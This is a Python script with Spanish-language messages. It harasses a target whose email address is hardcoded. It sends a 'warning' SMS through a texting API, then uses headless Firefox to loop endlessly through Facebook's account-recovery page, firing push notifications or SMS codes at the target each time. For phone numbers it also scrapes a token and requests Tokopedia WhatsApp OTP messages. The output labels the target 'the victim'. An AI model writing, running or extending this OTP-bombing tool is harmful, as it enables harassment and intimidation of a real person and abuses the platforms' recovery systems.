from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from colorama import Fore, Style, init
import time, requests, random, json, re, os

init(autoreset=True)
GREEN = f"{Fore.GREEN}{Style.BRIGHT}"
WHITE = f"{Fore.WHITE}{Style.BRIGHT}"
RED = f"{Fore.RED}{Style.BRIGHT}"
email_or_phone = 'danielaruizx159@gmail.com'

def tokped(number):
 kirim = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:133.0) Gecko/20100101 Firefox/133.0',
 'Accept-Encoding': 'gzip, deflate',
 'Connection': 'keep-alive',
 'Origin': 'https://accounts.tokopedia.com',
 'Accept': 'application/json, text/javascript, */*; q=0.01',
 'X-Requested-With': 'XMLHttpRequest',
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
 }

 regist = requests.get(f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={number}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{number}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers=kirim).text
 Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
 formulir = {
 "otp_type": "116",
 "msisdn": number,
 "tk": Token,
 "number_otp_digit": "6"
 }
 req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=kirim, data=formulir).text
 response = json.loads(req)
 status = response['success']

 if status:
  print(f"{GREEN}[+] {WHITE}MENSAJE ENVIADO A LA VICTIMA")


dig = email_or_phone[1:].isdigit()
if dig == True:
 nx0 = email_or_phone


url = 'https://www.facebook.com/login/identify/'
resp = requests.post('https://textbelt.com/text', {
'phone': f'{email_or_phone}',
'message': '!ESTO ES SOLO UNA ADVERTENCIA!',
'key': 'textbelt',
})
status = resp.json()['success']
if status == True:
 print(f"{GREEN}[+]{WHITE} MENSAJE ENVIADO")

options = Options()
options.add_argument("--headless")
service = Service(executable_path='..\\geckodriver.exe')
driver = webdriver.Firefox(service=service, options=options)

driver.get(url)
time.sleep(2)
print(f"{GREEN}[*]{WHITE} AHORA ESTAS EN FACEBOOK")
element = driver.find_element(By.ID, "identify_email")
element.send_keys(email_or_phone)
element.send_keys(Keys.RETURN)
time.sleep(8)
def otro_metodo():
 enlace = driver.find_element(By.LINK_TEXT, "Usar otro método")
 enlace.click()

try:
 otro_metodo()
except:
 try:
  enlace = driver.find_element(By.LINK_TEXT, "Esta es mi cuenta")
  enlace.click()
  otro_metodo()
 except:
  otro_metodo()

time.sleep(2)
n=1
while True:
 time.sleep(9)
 try:
  radio_button = driver.find_element(By.ID, "send_push_to_session_login")
  radio_button.click()
  x=1
 except:
  radio_button_sms = driver.find_element(By.CSS_SELECTOR, "input[id^='send_sms']")
  radio_button_sms.click()
  boton_continuar = driver.find_element(By.XPATH, "//button[text()='Continuar']")
  boton_continuar.click()
  x=2
 try:
  time.sleep(4)
  boton_continuar = driver.find_element(By.XPATH, "//button[text()='Continuar']")
  boton_continuar.click()
 except Exception as e:
  print("No se pudo encontrar el botón 'Continuar':", e)
 if x == 1:
  print(f"{GREEN}[{n}]{WHITE} NOTIFICACION A FACEBOOK ENVIADA CON EXITO")
 elif x == 2:
  print(f"{GREEN}[{n}]{WHITE} MENSAJE DE TEXTO ENVIADO CON EXITO")
 if dig == True:
  if n < 4:
   tokped(nx0)
 n=n+1
 time.sleep(6)
 driver.back()
